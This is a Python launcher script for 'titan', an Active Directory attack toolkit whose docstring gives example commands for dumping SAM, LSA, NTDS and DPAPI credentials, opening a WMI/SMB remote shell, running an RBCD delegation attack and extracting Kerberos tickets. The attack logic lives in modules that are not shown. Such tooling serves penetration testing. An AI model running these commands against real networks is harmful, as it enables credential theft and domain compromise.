#!/usr/bin/env python3
"""titan — Titanis-powered AD attack toolkit

A unified wrapper for the Titanis .NET security tool suite.
Think secretsdump + evil-winrm + RBCD, with impacket-compatible flags.

Usage: titan <subcommand> [options]

Subcommands:
  dump   Dump SAM, LSA, DCC2, NTDS, DPAPI credentials (secretsdump-style)
  shell  Interactive WMI+SMB shell (evil-winrm-style)
  rbcd   Resource-Based Constrained Delegation attack chain
  klist  Dump all Kerberos TGTs → MIT ccache files (requires Tsch binary)

Run  titan <subcommand> -h  for per-subcommand help.

Quick examples:
  titan dump ECORP/veeam-admin:'B@ckupP@ssw0rd'@192.168.15.40
  titan dump -u Administrator -d ECORP -p 'P@ss' --ntds -t 192.168.15.40
  titan dump -u Administrator -d ECORP -hashes :NThash -t 192.168.15.40
  KRB5CCNAME=Administrator.ccache titan dump -k -no-pass -t 192.168.15.40

  titan shell ECORP/Administrator:'P@ss'@192.168.15.42
  titan rbcd full --delegate-to ECORP-DC$ ECORP/user:'pass'@192.168.15.40

  titan klist ECORP/Administrator:'P@ss'@192.168.15.42
  titan klist -u Administrator -d ECORP --hash :NThash -t 192.168.15.42 -o ./loot/
"""

import os
import sys

_TITAN_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, _TITAN_DIR)

USAGE = __doc__


def main():
    if len(sys.argv) < 2 or sys.argv[1] in ('-h', '--help', 'help'):
        print(USAGE)
        sys.exit(0 if len(sys.argv) > 1 else 1)

    sub = sys.argv.pop(1)
    sys.argv[0] = f'titan {sub}'

    if sub == 'dump':
        from titanlib.dump import main as _m
        _m()
    elif sub == 'shell':
        from titanlib.shell import main as _m
        _m()
    elif sub == 'rbcd':
        from titanlib.rbcd import main as _m
        _m()
    elif sub == 'klist':
        from titanlib.klist import main as _m
        _m()
    else:
        print(f'[!] Unknown subcommand: {sub!r}\n', file=sys.stderr)
        print(USAGE, file=sys.stderr)
        sys.exit(1)


if __name__ == '__main__':
    main()
